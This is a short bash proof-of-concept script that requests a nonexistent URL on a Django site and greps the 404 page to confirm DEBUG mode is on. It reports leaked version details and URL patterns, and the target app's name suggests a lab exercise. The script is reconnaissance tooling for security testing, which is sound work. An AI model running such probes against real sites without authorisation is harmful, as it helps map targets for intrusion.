#!/bin/bash

# POC: Django DEBUG = True Information Disclosure
# This script demonstrates how an enabled DEBUG mode in Django production
# leaks sensitive information about the application structure, routing, and framework details.

TARGET_URL="${1:-http://localhost}"
TEST_ENDPOINT="/nonexistent_endpoint_12345"

echo "[*] Django DEBUG Mode Information Disclosure POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing endpoint: $TEST_ENDPOINT"
echo ""

# Perform request to non-existent endpoint to trigger 404 with debug info
RESPONSE=$(curl -s "$TARGET_URL$TEST_ENDPOINT")

# Check if DEBUG mode is enabled by looking for telltale debug page markers
if echo "$RESPONSE" | grep -q "DEBUG = True"; then
    echo "[+] VULNERABILITY CONFIRMED: DEBUG = True is enabled"
    echo ""
    echo "[+] Evidence found in response:"
    
    # Extract and display sensitive information
    if echo "$RESPONSE" | grep -q "You're seeing this error because you have DEBUG = True"; then
        echo "  ✓ Debug error page message detected"
    fi
    
    if echo "$RESPONSE" | grep -q "ssti_debug_art_gallery"; then
        echo "  ✓ Application name 'ssti_debug_art_gallery' disclosed"
    fi
    
    if echo "$RESPONSE" | grep -q "Django Version"; then
        echo "  ✓ Django version information exposed"
    fi
    
    if echo "$RESPONSE" | grep -iq "accounts/\|static/"; then
        echo "  ✓ URL patterns and routing structure exposed"
    fi
    
    if echo "$RESPONSE" | grep -q "http://"; then
        echo "  ✓ Full request metadata visible"
    fi
    
    echo ""
    echo "[+] Displaying first 2000 characters of response:"
    echo "---BEGIN RESPONSE---"
    echo "$RESPONSE" | head -c 2000
    echo ""
    echo "---END RESPONSE---"
    echo ""
    echo "[!] Risk Assessment:"
    echo "  - Framework details can enable targeted attacks"
    echo "  - Application structure is fully mapped"
    echo "  - Potential for SECRET_KEY exposure if exceptions occur"
    echo "  - Facilitates further reconnaissance and exploitation"
    
    exit 0
else
    echo "[-] DEBUG mode not detected or target not responding correctly"
    echo ""
    echo "[*] Response snippet:"
    echo "$RESPONSE" | head -c 500
    exit 1
fi